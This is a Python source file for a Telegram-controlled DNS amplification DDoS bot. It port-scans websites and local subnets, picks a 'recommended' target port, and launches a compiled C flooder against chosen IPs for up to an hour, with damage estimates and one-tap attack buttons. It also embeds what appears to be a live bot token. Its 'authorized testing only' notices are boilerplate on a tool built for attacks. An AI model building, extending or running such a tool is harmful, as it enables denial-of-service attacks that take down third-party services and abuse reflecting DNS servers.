#!/usr/bin/env python3
import asyncio
import subprocess
import os
import re
import psutil
import threading
import time
import json
from datetime import datetime
import socket
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import nmap
import dns.resolver
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# Bot configuration
BOT_TOKEN = "5937510175:AAGzZWFRZMoftU-QweEL67vJo2kysBYlJwg"
ADMIN_USER_IDS = [5939471267]  # Your Telegram User IDs

# Global attack manager
class TargetScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
        self.common_ports = [80, 443, 53, 22, 21, 25, 110, 143, 993, 995, 8080, 8443, 8888]
        self.common_subnets = [
            '192.168.1.0/24', '192.168.0.0/24', '10.0.0.0/24', '172.16.1.0/24',
            '192.168.2.0/24', '192.168.100.0/24'
        ]
    
    async def scan_website(self, url):
        """Extract IP and scan open ports from a website URL"""
        try:
            # Extract domain from URL
            domain = url.replace('https://', '').replace('http://', '').split('/')[0]
            
            # Resolve domain to IP
            try:
                ip = socket.gethostbyname(domain)
            except:
                return None, "Could not resolve domain"
            
            # Scan common ports
            open_ports = await self.scan_ports(ip)
            
            return {
                'domain': domain,
                'ip': ip,
                'open_ports': open_ports,
                'url': url
            }, None
            
        except Exception as e:
            return None, f"Scan error: {str(e)}"
    
    async def scan_ports(self, ip, ports=None):
        """Scan for open ports on target IP"""
        if ports is None:
            ports = self.common_ports
        
        open_ports = []
        
        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(2)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        return port
            except:
                pass
            return None
        
        # Use thread pool for parallel port scanning
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_port, port) for port in ports]
            for future in futures:
                result = future.result()
                if result:
                    open_ports.append(result)
        
        return sorted(open_ports)
    
    async def network_discovery(self):
        """Discover active hosts on common subnets"""
        active_hosts = []
        
        def scan_subnet(subnet):
            try:
                self.nm.scan(hosts=subnet, arguments='-sn')
                hosts = []
                for host in self.nm.all_hosts():
                    if self.nm[host].state() == 'up':
                        hosts.append(host)
                return hosts
            except:
                return []
        
        # Scan subnets in parallel
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(scan_subnet, subnet): subnet for subnet in self.common_subnets}
            for future in futures:
                hosts = future.result()
                active_hosts.extend(hosts)
        
        return active_hosts
    
    async def comprehensive_scan(self, target):
        """Comprehensive scan of a target (IP or domain)"""
        try:
            # Determine if target is IP or domain
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                ip = target
                domain = None
            else:
                domain = target
                ip = socket.gethostbyname(domain)
            
            # Scan all common ports
            open_ports = await self.scan_ports(ip, range(1, 1001))
            
            # Get service info for open ports
            port_services = {}
            for port in open_ports[:10]:  # Limit to first 10 for speed
                service = await self.get_service_info(ip, port)
                port_services[port] = service
            
            return {
                'target': target,
                'ip': ip,
                'domain': domain,
                'open_ports': open_ports,
                'port_services': port_services,
                'ports_count': len(open_ports)
            }, None
            
        except Exception as e:
            return None, f"Comprehensive scan failed: {str(e)}"
    
    async def get_service_info(self, ip, port):
        """Get service information for a port"""
        try:
            service = socket.getservbyport(port) if port in self.common_ports else "unknown"
            return service
        except:
            return "unknown"

class DNSAttackManager:
    def __init__(self):
        self.process = None
        self.is_running = False
        self.start_time = None
        self.attack_log = []
        self.max_log_entries = 100
        self.scanner = TargetScanner()
        self.pending_attacks = {}  # Store pending attack parameters
        
    def log_attack(self, action, target=None, duration=None, user=None):
        """Log attack activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'duration': duration,
            'user': user,
            'pid': self.process.pid if self.process else None
        }
        self.attack_log.append(log_entry)
        
        # Keep log size manageable
        if len(self.attack_log) > self.max_log_entries:
            self.attack_log.pop(0)
    
    async def auto_select_target(self, website_url=None, network_scan=False, custom_target=None):
        """Automatically find and select optimal target"""
        targets = []
        
        if website_url:
            # Scan specific website
            scan_result, error = await self.scanner.scan_website(website_url)
            if scan_result:
                targets.append(scan_result)
        
        elif network_scan:
            # Discover network hosts
            active_hosts = await self.scanner.network_discovery()
            
            for host in active_hosts[:5]:  # Limit to first 5 hosts
                scan_result, error = await self.scanner.comprehensive_scan(host)
                if scan_result and scan_result['open_ports']:
                    targets.append(scan_result)
        
        elif custom_target:
            # Scan custom target (IP or domain)
            scan_result, error = await self.scanner.comprehensive_scan(custom_target)
            if scan_result:
                targets.append(scan_result)
        
        # Select best target based on open ports
        if targets:
            best_target = max(targets, key=lambda x: len(x.get('open_ports', [])))
            return best_target, None
        else:
            return None, "No suitable targets found"
    
    async def compile_c_program(self):
        """Compile the C DNS amplifier"""
        try:
            if os.path.exists("./soul2"):
                return True, "Binary already exists"
                
            compile_cmd = ["gcc", "-o", "soul2", "soul2.c", "-lpthread", "-O3"]
            result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                return True, "Compilation successful"
            else:
                return False, f"Compilation failed: {result.stderr}"
                
        except Exception as e:
            return False, f"Compilation error: {str(e)}"
    
    def validate_target(self, ip, port):
        """Validate target IP and port"""
        # IP validation
        ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
        if not ip_pattern.match(ip):
            return False, "Invalid IP address format"
        
        # Check IP segments
        segments = ip.split('.')
        for segment in segments:
            if not (0 <= int(segment) <= 255):
                return False, "Invalid IP address range"
        
        # Port validation
        if not (1 <= port <= 65535):
            return False, "Port must be 1-65535"
        
        return True, "Valid target"
    
    async def start_attack(self, ip, port, duration, user):
        """Start DNS amplification attack"""
        if self.is_running:
            return False, "Attack already running! Stop current attack first."
        
        # Validate parameters
        is_valid, message = self.validate_target(ip, port)
        if not is_valid:
            return False, message
        
        if not (1 <= duration <= 3600):
            return False, "Duration must be 1-3600 seconds"
        
        try:
            # Check if binary exists and compile if needed
            if not os.path.exists("./soul2"):
                success, compile_msg = await self.compile_c_program()
                if not success:
                    return False, f"Compilation failed: {compile_msg}"
            
            # Check root privileges
            if os.geteuid() != 0:
                return False, "Root privileges required! Run bot with sudo."
            
            # Start attack
            command = ["./soul2", ip, str(port), str(duration)]
            self.process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.is_running = True
            self.start_time = datetime.now()
            
            # Log the attack
            self.log_attack("START", f"{ip}:{port}", duration, user)
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_attack)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            return True, f"Attack started on {ip}:{port} for {duration}s"
            
        except Exception as e:
            return False, f"Failed to start attack: {str(e)}"
    
    def monitor_attack(self):
        """Monitor the attack process in background"""
        try:
            stdout, stderr = self.process.communicate()
            self.is_running = False
            
            # Log completion
            duration = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
            self.log_attack("COMPLETE", duration=duration)
            
        except Exception as e:
            print(f"Monitor error: {e}")
            self.is_running = False
    
    def stop_attack(self):
        """Stop current attack"""
        if not self.is_running or not self.process:
            return False, "No active attack to stop"
        
        try:
            # Kill process tree
            parent = psutil.Process(self.process.pid)
            children = parent.children(recursive=True)
            
            for child in children:
                child.terminate()
            parent.terminate()
            
            # Wait for termination
            gone, still_alive = psutil.wait_procs([parent] + children, timeout=5)
            for p in still_alive:
                p.kill()
            
            self.is_running = False
            self.process = None
            
            # Log stop
            self.log_attack("STOP")
            
            return True, "Attack stopped successfully"
            
        except Exception as e:
            return False, f"Error stopping attack: {str(e)}"
    
    def get_attack_info(self):
        """Get current attack information"""
        if not self.is_running:
            return None
        
        info = {
            'running': self.is_running,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'duration': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0,
            'pid': self.process.pid if self.process else None
        }
        
        return info
    
    def calculate_impact(self, ip, port, duration):
        """Calculate estimated attack impact"""
        # DNS amplification calculations
        queries_per_second = 1900000  # From C code
        avg_query_size = 512  # bytes
        amplification_ratio = 50  # 50:1 average
        
        total_queries = queries_per_second * duration
        outgoing_traffic = (total_queries * avg_query_size) / (1024**3)  # GB
        incoming_traffic = outgoing_traffic * amplification_ratio  # GB
        
        outgoing_bw = (queries_per_second * avg_query_size * 8) / 1_000_000_000  # Gbps
        incoming_bw = outgoing_bw * amplification_ratio  # Gbps
        
        return {
            'target': f"{ip}:{port}",
            'duration': duration,
            'total_queries': f"{total_queries:,}",
            'outgoing_traffic_gb': f"{outgoing_traffic:.2f}",
            'incoming_traffic_gb': f"{incoming_traffic:.2f}",
            'outgoing_bandwidth_gbps': f"{outgoing_bw:.2f}",
            'incoming_bandwidth_gbps': f"{incoming_bw:.2f}",
            'amplification_ratio': amplification_ratio,
            'threads': 400,
            'dns_servers': 50
        }
    
    def select_best_port(self, open_ports):
        """Select the best port for DNS amplification attack"""
        # Prefer web ports for maximum impact
        web_ports = [80, 443, 8080, 8443]
        for port in open_ports:
            if port in web_ports:
                return port
        
        # Return first open port if no web ports found
        return open_ports[0] if open_ports else 80

# Initialize attack manager
attack_manager = DNSAttackManager()

def is_admin(update: Update):
    """Check if user is admin"""
    return update.effective_user.id in ADMIN_USER_IDS

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access. This bot is for admin use only.")
        return
    
    user = update.effective_user
    welcome_text = f"""
🤖 **DNS Amplification Bot - Auto Target Mode** 🤖

Welcome {user.mention_html()}!

**🎯 Auto Target Commands:**
/scan_website <URL> - Scan website and auto-attack
/scan_network - Discover local network targets  
/scan_target <IP/DOMAIN> - Scan specific target
/quick_attack <URL> - Quick scan & immediate attack

**⚡ Manual Attack Commands:**
/calc <IP> <PORT> <TIME> - Calculate impact
/attack <IP> <PORT> <TIME> - Manual attack
/stop - Stop current attack

**📊 Monitoring Commands:**
/status - Attack status
/stats - System stats
/logs - Attack history
/info - Bot information

**🔍 Scanning Features:**
• Port Scanning: 1-1000 common ports
• Service Detection: Automatic identification  
• Network Discovery: Local subnet scanning
• Website Analysis: Domain to IP resolution

⚠️ **Use responsibly and only on authorized targets!**
    """
    
    await update.message.reply_html(welcome_text)

async def scan_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Scan a website and automatically select target"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /scan_website <URL>")
        return
    
    website_url = context.args[0]
    
    # Send scanning message
    scan_msg = await update.message.reply_text(f"🔍 Scanning website: `{website_url}`...")
    
    try:
        # Update scan progress
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=f"🔍 Scanning `{website_url}`...\n🔄 Resolving domain..."
        )
        
        # Perform scan
        target_info, error = await attack_manager.auto_select_target(website_url=website_url)
        
        if error:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=scan_msg.message_id,
                text=f"❌ Scan failed: {error}"
            )
            return
        
        # Create results message
        result_text = f"""
✅ **Target Analysis Complete**

🌐 **Website Info:**
URL: {target_info['url']}
Domain: {target_info['domain']}
IP: `{target_info['ip']}`
        """
        
        if target_info['open_ports']:
            ports_str = ", ".join(map(str, target_info['open_ports'][:10]))
            if len(target_info['open_ports']) > 10:
                ports_str += f" ... and {len(target_info['open_ports']) - 10} more"
            
            result_text += f"\n🚪 **Open Ports Found:** {ports_str}"
            
            # Suggest best port for attack
            best_port = attack_manager.select_best_port(target_info['open_ports'])
            result_text += f"\n🎯 **Recommended Target:** `{target_info['ip']}:{best_port}`"
            
            # Create inline keyboard for quick attack
            keyboard = [
                [InlineKeyboardButton("⚡ Quick Attack (30s)", callback_data=f"quick_{target_info['ip']}_{best_port}_30")],
                [InlineKeyboardButton("⚡ Quick Attack (60s)", callback_data=f"quick_{target_info['ip']}_{best_port}_60")],
                [InlineKeyboardButton("📊 Calculate Impact", callback_data=f"calc_{target_info['ip']}_{best_port}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
        else:
            result_text += "\n❌ **No Open Ports Found**"
            reply_markup = None
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=result_text,
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=f"❌ Scan error: {str(e)}"
        )

async def scan_network(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Discover and scan local network targets"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    scan_msg = await update.message.reply_text("🔍 Discovering active hosts on local network...")
    
    try:
        # Discover hosts
        active_hosts = await attack_manager.scanner.network_discovery()
        
        if not active_hosts:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=scan_msg.message_id,
                text="❌ No active hosts found on local network"
            )
            return
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=f"✅ Found {len(active_hosts)} active hosts\n🔍 Scanning for open ports..."
        )
        
        # Scan each host
        vulnerable_targets = []
        for i, host in enumerate(active_hosts[:3]):  # Limit to 3 hosts for speed
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=scan_msg.message_id,
                text=f"🔍 Scanning hosts... ({i+1}/{min(3, len(active_hosts))})"
            )
            
            target_info, error = await attack_manager.scanner.comprehensive_scan(host)
            if target_info and target_info['open_ports']:
                vulnerable_targets.append(target_info)
        
        # Display results
        if not vulnerable_targets:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=scan_msg.message_id,
                text="❌ No vulnerable targets found with open ports"
            )
            return
        
        result_text = f"✅ **Network Scan Complete**\nFound {len(vulnerable_targets)} vulnerable targets\n\n"
        
        # Create inline keyboard with targets
        keyboard = []
        for i, target in enumerate(vulnerable_targets[:3]):
            best_port = attack_manager.select_best_port(target['open_ports'])
            result_text += f"🎯 **Target {i+1}:** `{target['ip']}` (Ports: {len(target['open_ports'])})\n"
            
            keyboard.append([
                InlineKeyboardButton(f"⚡ Attack {target['ip']}", 
                                   callback_data=f"quick_{target['ip']}_{best_port}_30")
            ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=result_text,
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=f"❌ Network scan error: {str(e)}"
        )

async def scan_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comprehensive scan of specific target"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /scan_target <IP or DOMAIN>")
        return
    
    target = context.args[0]
    scan_msg = await update.message.reply_text(f"🔍 Comprehensive scan of `{target}`...")
    
    try:
        # Perform comprehensive scan
        target_info, error = await attack_manager.scanner.comprehensive_scan(target)
        
        if error:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=scan_msg.message_id,
                text=f"❌ Scan failed: {error}"
            )
            return
        
        # Create results
        result_text = f"""
✅ **Comprehensive Scan Complete**

🌐 **Target Info:**
"""
        if target_info['domain']:
            result_text += f"Domain: {target_info['domain']}\n"
        result_text += f"IP: `{target_info['ip']}`\n"
        result_text += f"Open Ports: {target_info['ports_count']}\n"

        if target_info['open_ports']:
            result_text += "\n🔧 **Top Services:**\n"
            for port in list(target_info['open_ports'])[:6]:
                service = target_info['port_services'].get(port, "unknown")
                result_text += f"• Port `{port}` ({service})\n"
            
            # Attack recommendation
            best_port = attack_manager.select_best_port(target_info['open_ports'])
            result_text += f"\n🎯 **Recommended:** `{target_info['ip']}:{best_port}`"
            
            # Create attack buttons
            keyboard = [
                [InlineKeyboardButton("⚡ Quick Attack (30s)", callback_data=f"quick_{target_info['ip']}_{best_port}_30")],
                [InlineKeyboardButton("⚡ Quick Attack (60s)", callback_data=f"quick_{target_info['ip']}_{best_port}_60")],
                [InlineKeyboardButton("📊 Calculate Impact", callback_data=f"calc_{target_info['ip']}_{best_port}")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
        else:
            result_text += "\n❌ No open ports found"
            reply_markup = None
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=result_text,
            reply_markup=reply_markup
        )
        
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=scan_msg.message_id,
            text=f"❌ Scan error: {str(e)}"
        )

async def quick_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quick scan and immediate attack"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /quick_attack <URL> [duration=30]")
        return
    
    website_url = context.args[0]
    duration = int(context.args[1]) if len(context.args) > 1 else 30
    
    attack_msg = await update.message.reply_text(f"🔍 Quick attack initiated on `{website_url}`...")
    
    try:
        # Scan target
        target_info, error = await attack_manager.auto_select_target(website_url=website_url)
        
        if error:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=attack_msg.message_id,
                text=f"❌ Scan failed: {error}"
            )
            return
        
        if not target_info.get('open_ports'):
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=attack_msg.message_id,
                text="❌ No open ports found for attack"
            )
            return
        
        # Select best port and launch attack
        best_port = attack_manager.select_best_port(target_info['open_ports'])
        ip = target_info['ip']
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=attack_msg.message_id,
            text=f"🎯 Auto-selected target: `{ip}:{best_port}`\n🚀 Starting attack..."
        )
        
        # Start attack
        success, message = await attack_manager.start_attack(ip, best_port, duration, update.effective_user.name)
        
        if success:
            result_text = f"""
✅ **Quick Attack Launched**

🎯 **Target Info:**
Website: {website_url}
IP: `{ip}`
Port: {best_port}
Duration: {duration}s

📊 **Monitoring:**
Use /status to check progress
Use /stop to terminate early
            """
        else:
            result_text = f"❌ **Quick Attack Failed**\n{message}"
        
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=attack_msg.message_id,
            text=result_text
        )
        
    except Exception as e:
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=attack_msg.message_id,
            text=f"❌ Quick attack error: {str(e)}"
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button presses"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data.startswith('quick_'):
        # Quick attack button
        _, ip, port, duration = data.split('_')
        await query.edit_message_text(f"🚀 Starting attack on `{ip}:{port}` for {duration}s...")
        
        success, message = await attack_manager.start_attack(ip, int(port), int(duration), query.from_user.name)
        
        if success:
            await query.edit_message_text(f"✅ {message}")
        else:
            await query.edit_message_text(f"❌ {message}")
    
    elif data.startswith('calc_'):
        # Calculate impact button
        _, ip, port = data.split('_')
        impact = attack_manager.calculate_impact(ip, int(port), 30)
        
        result_text = f"""
📊 **Impact Calculation**

🎯 Target: `{ip}:{port}`
⏰ Duration: 30 seconds

📈 **Estimated Impact:**
• Queries Sent: {impact['total_queries']}
• Outgoing Traffic: {impact['outgoing_traffic_gb']} GB
• Incoming Traffic: {impact['incoming_traffic_gb']} GB
• Target Bandwidth: {impact['incoming_bandwidth_gbps']} Gbps
• Amplification: {impact['amplification_ratio']}:1

⚡ **Start Attack:**
/attack {ip} {port} 30
        """
        
        await query.edit_message_text(result_text)

# Keep all the existing command handlers (calc, attack, stop, status, stats, logs, info)
# ... [Include all previous command handlers here] ...

async def calc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Calculate attack impact"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /calc <IP> <PORT> <TIME>")
        return
    
    ip, port, duration = context.args
    duration = int(duration)
    
    impact = attack_manager.calculate_impact(ip, int(port), duration)
    
    result_text = f"""
📊 **DNS Amplification Impact Calculation**

🎯 Target: `{ip}:{port}`
⏰ Duration: {duration} seconds

🚀 **Attack Profile:**
• Queries/Second: 1,900,000
• Threads: {impact['threads']}
• DNS Servers: {impact['dns_servers']}
• Amplification: {impact['amplification_ratio']}:1

📈 **Traffic Estimates:**
• Total Queries: {impact['total_queries']}
• Outgoing Data: {impact['outgoing_traffic_gb']} GB
• Incoming Data: {impact['incoming_traffic_gb']} GB

⚡ **Bandwidth Estimates:**
• Outgoing: {impact['outgoing_bandwidth_gbps']} Gbps
• Incoming: {impact['incoming_bandwidth_gbps']} Gbps
• Estimated Power: 15-30 Tbps

⚠️ **This attack can cause significant network disruption.**
    """
    
    # Add inline button for quick attack
    keyboard = [[InlineKeyboardButton("⚡ Launch Attack", callback_data=f"quick_{ip}_{port}_{duration}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(result_text, reply_markup=reply_markup)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manual DNS amplification attack"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <IP> <PORT> <TIME>")
        return
    
    ip, port, duration = context.args
    
    # Show calculation first
    await calc(update, context)
    
    # Then start attack
    success, message = await attack_manager.start_attack(ip, int(port), int(duration), update.effective_user.name)
    
    if success:
        await update.message.reply_text(f"✅ {message}")
    else:
        await update.message.reply_text(f"❌ {message}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current attack"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    success, message = attack_manager.stop_attack()
    await update.message.reply_text(f"🛑 {message}")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    attack_info = attack_manager.get_attack_info()
    
    if attack_info and attack_info['running']:
        duration = attack_info['duration']
        status_text = f"""
🟢 **ATTACK RUNNING**

⏱️ Duration: {duration:.1f}s
🔢 PID: {attack_info['pid']}

🚀 Estimated Impact:
• 15-30 Tbps to target
• 1.9M queries/second

Use /stop to terminate attack
        """
    else:
        status_text = """
🔴 **NO ACTIVE ATTACK**

💡 Next Steps:
Use /scan_website to find targets
Use /scan_network for local discovery
Use /attack for manual targeting
        """
    
    await update.message.reply_text(status_text)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show system statistics"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    try:
        # CPU usage
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # Memory usage
        memory = psutil.virtual_memory()
        
        # Network stats
        net_io = psutil.net_io_counters()
        
        # Disk usage
        disk = psutil.disk_usage('/')
        
        stats_text = f"""
💻 **System Statistics**

🖥️ **CPU:**
Usage: {cpu_percent}%
Cores: {psutil.cpu_count()}

💾 **Memory:**
Used: {memory.percent}%
Available: {memory.available // (1024**3)} GB

📡 **Network:**
Sent: {net_io.bytes_sent // (1024**2)} MB
Received: {net_io.bytes_recv // (1024**2)} MB

💿 **Disk:**
Used: {disk.percent}%
Free: {disk.free // (1024**3)} GB
        """
        
        # Add attack status
        attack_info = attack_manager.get_attack_info()
        if attack_info and attack_info['running']:
            stats_text += f"\n🚀 **Attack Status:** Running for {attack_info['duration']:.1f}s"
        
        await update.message.reply_text(stats_text)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error getting statistics: {str(e)}")

async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show attack history"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if not attack_manager.attack_log:
        await update.message.reply_text("📝 No attack history found")
        return
    
    # Show last 5 entries
    recent_logs = attack_manager.attack_log[-5:]
    
    logs_text = "📋 **Recent Attack History**\n\n"
    
    for log in reversed(recent_logs):
        timestamp = datetime.fromisoformat(log['timestamp']).strftime("%m/%d %H:%M")
        
        if log['action'] == 'START':
            logs_text += f"🟢 {timestamp} - START\n   Target: {log['target']}\n   Duration: {log['duration']}s\n\n"
        elif log['action'] == 'STOP':
            logs_text += f"🟡 {timestamp} - STOPPED\n\n"
        elif log['action'] == 'COMPLETE':
            logs_text += f"🔵 {timestamp} - COMPLETED\n   Duration: {log['duration']:.1f}s\n\n"
    
    await update.message.reply_text(logs_text)

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot information"""
    if not is_admin(update):
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    info_text = """
🤖 **DNS Amplification Bot Info**

⚡ **Capabilities:**
• Type: DNS Reflection/Amplification
• Amplification: 50:1 ratio
• Max Queries/sec: 1,900,000
• DNS Servers: 50 providers
• Estimated Power: 15-30 Tbps

🛠️ **Technical:**
• Backend: Custom C implementation
• Threads: 400 concurrent
• Protocol: Raw sockets with IP spoofing
• Query Type: ANY + EDNS for max amplification

🔍 **Auto-Targeting:**
• Website scanning & analysis
• Network discovery
• Port scanning (1-1000 ports)
• Service detection

⚠️ **Legal Notice:**
This tool is for authorized testing only.
Unauthorized use is illegal and unethical.
Users are responsible for proper authorization.
    """
    
    await update.message.reply_text(info_text)

def main():
    """Start the Telegram bot"""
    print("🚀 Starting DNS Amplification Telegram Bot with Auto-Targeting...")
    print("📋 Required packages: python-telegram-bot, python-nmap, dnspython, psutil")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("scan_website", scan_website))
    application.add_handler(CommandHandler("scan_network", scan_network))
    application.add_handler(CommandHandler("scan_target", scan_target))
    application.add_handler(CommandHandler("quick_attack", quick_attack))
    application.add_handler(CommandHandler("calc", calc))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("stats", stats))
    application.add_handler(CommandHandler("logs", logs))
    application.add_handler(CommandHandler("info", info))
    
    # Add button handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Start the bot
    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
